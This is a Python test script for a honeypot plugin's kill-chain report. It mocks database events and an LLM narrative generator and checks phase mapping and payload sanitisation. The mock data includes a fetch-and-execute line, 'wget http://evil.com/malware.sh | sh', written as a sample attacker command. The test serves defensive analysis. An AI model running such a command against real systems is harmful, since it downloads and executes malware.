#!/usr/bin/env python3
"""Test script for Sequential Analysis (Kill Chain) report section.

Verifies:
1. Aggregator logic (build_sequential_analysis)
2. Sanitization of payloads
3. LLM prompt generation and narrative integration
"""

import asyncio
import logging
from core.observability.logging import get_logger
import sys
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from plugins.honeypot.reports.aggregator import ReportDataAggregator
from plugins.honeypot.reports.llm.generators.research_report_generator import (
    ResearchReportGenerator,
)

logging.basicConfig(level=logging.INFO)
logger = get_logger(__name__)


async def test_aggregator_logic():
    """Test build_sequential_analysis logic."""
    logger.info("Testing Aggregator Logic...")

    # Mock DAO
    dao_mock = MagicMock()
    # Mock get_connection -> cursor -> execute/fetchall (async)
    conn_mock = AsyncMock()
    cursor_mock = AsyncMock()

    # Connection context manager
    conn_mock.__aenter__.return_value = conn_mock

    # Cursor context manager (cursor() method is SYNC, returns AsyncContextManager)
    conn_mock.cursor = MagicMock(return_value=cursor_mock)
    cursor_mock.__aenter__.return_value = cursor_mock

    dao_mock.get_connection.return_value = conn_mock

    # Mock get_events to return critical events
    event_mock = MagicMock()
    event_mock.session_id = "sess_123"
    dao_mock.get_events = AsyncMock(return_value=([event_mock], 1))

    # Mock get_sessions (called initially)
    dao_mock.get_sessions = AsyncMock(return_value=([], 0))

    # Mock get_session_by_id
    session_mock = MagicMock()
    session_mock.source_ip = "192.168.1.100"
    dao_mock.get_session_by_id = AsyncMock(return_value=session_mock)

    # Mock SQL results for steps
    # timestamp, event_type, category, severity, raw_data, ai_classification
    ts = datetime.now(timezone.utc)
    cursor_mock.fetchall.return_value = [
        (ts, "connection", "reconnaissance", "medium", "", "Port scanning"),
        (ts, "auth", "auth_attempt", "high", "user=admin&pass=123", "Brute force"),
        (
            ts,
            "command",
            "rce",
            "critical",
            "wget http://evil.com/malware.sh | sh",
            "Malware Download",
        ),
    ]

    aggregator = ReportDataAggregator(dao_mock)
    results = await aggregator.build_sequential_analysis(None, datetime.now())

    assert len(results) == 1
    analysis = results[0]
    assert analysis.session_id == "sess_123"
    assert analysis.attacker_ip == "192.168.1.100"
    assert len(analysis.steps) == 3

    # Verify steps
    assert analysis.steps[0].phase == "Reconnaissance"
    assert analysis.steps[1].phase == "Initial Access"
    assert "brute force" in analysis.steps[1].description.lower()

    # Verify payload sanitization
    payload = analysis.steps[2].payload_snippet
    assert "wget" in payload
    # Check that sanitization didn't break it
    logger.info("Aggregator Logic Passed")
    return results


async def test_generator_logic(session_analysis):
    """Test LLM generator integration."""
    logger.info("Testing Generator Logic...")

    llm_service_mock = AsyncMock()
    llm_service_mock.generate_response.return_value = (
        "This is a mock narrative describing the attack."
    )

    generator = ResearchReportGenerator(llm_service_mock)

    narrative = await generator.generate_attack_narrative(session_analysis[0])

    assert narrative is not None
    assert "mock narrative" in narrative
    logger.info(f"Generated Narrative: {narrative}")
    logger.info("Generator Logic Passed")


async def main():
    try:
        results = await test_aggregator_logic()
        await test_generator_logic(results)
        print("\n\u2713 ALL SEQUENTIAL ANALYSIS TESTS PASSED")
    except Exception as e:
        logger.error(f"Test failed: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
